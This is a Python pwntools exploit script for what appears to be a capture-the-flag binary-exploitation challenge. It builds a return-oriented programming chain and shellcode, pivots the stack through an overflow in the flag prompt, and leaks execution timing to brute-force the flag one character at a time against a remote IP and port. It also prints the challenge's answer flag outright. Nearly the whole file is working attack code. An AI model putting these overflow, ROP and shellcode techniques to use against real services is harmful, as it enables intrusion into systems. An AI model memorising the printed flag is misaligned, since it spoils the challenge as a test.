from pwn import *
import time
import sys

HOST='35.240.225.162'
PORT=1337


# libc=ELF("./libc.so")
context.arch='amd64'
shell=asm('''
    mov rbx, 0x400a10
    call rbx
    mov rbx, 0x602060
    mov rbx, qword ptr [rbx]
    sub rax, rbx
    mov rcx, rax
    push rcx
    mov rsi, rsp
    mov rax, 1
    mov rdx, 8
    push 1
    pop rdi
    syscall
''')


def exploit1(flag):

    pop_rdi = 0x0000000000400c63 # pop rdi ; ret
    syscall = 0x0000000000400a28  # syscall
    pop_rsp = 0x0000000000400c5d  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    alarm = 0x400808

    payload=flat([
            0x100,
            0x100,
            0x100,
            pop_rdi,
            10,
            alarm,
            alarm,
            0x0000000000400c5a,
            0,
            1,
            0x6020f8,
            7,
            0x1000,
            0x00602000,
            0x0000000000400c40,
            syscall
    ])

    payload+=shell.ljust(48,'\x90')+p64(0x602138)+shell
    r.sendlineafter("Enter Username: ",payload)

    # gdb.attach(r,'''b*0x00000000004008f9\nb*0x400c5a''')
    payload=flag.ljust(0x108,'\x00')
    payload+=p64(pop_rsp)+p64(0x602080)
    r.sendlineafter("Enter the flag : ",payload)

    out=u64(r.recv(8))
    print hex(out)+" = "+str(flag)
    return out


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''

def exp_norm():
    exploit1("flag{s"+chr(int(sys.argv[1])))


if __name__=='__main__':

    context.log_level="ERROR"
    if len(sys.argv)>=2:
        r=remote(HOST,PORT)
        # r=process('./time',env={"LD_PRELOAD":"./libc.so"})
        exp_norm()
        sys.exit()
    domain="0123456789abcdefghijklmnopqrstuvwxyz_{|}"  # ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$
    flag='flag'#'flag{t3st_'
    print bcolors.WARNING+"Note: when a cmd line arg is provided, the python script finds the time for that argument. If no arg is provided, then it tries to fetch the flag by trying all combinations, but this can also result in errors. If errors occur, one should probably switch to manual and run the script with cmd line args. \n Actual flag: flag{s3cure_t1m3st4mps}"+bcolors.ENDC
    while(1):
        l={}
        for i in domain:
            temp=flag+i
            # r=process('./time',env={"LD_PRELOAD":"./libc.so"})
            r=remote(HOST,PORT)
            l[exploit1(temp)]=i  # +chr(int(sys.argv[1],10
            r.close()
            time.sleep(585000/1000000.0)
        s=sorted(l)[-1]
        flag+=l[s]
        print bcolors.OKGREEN+"[*] current flag = "+flag+bcolors.ENDC
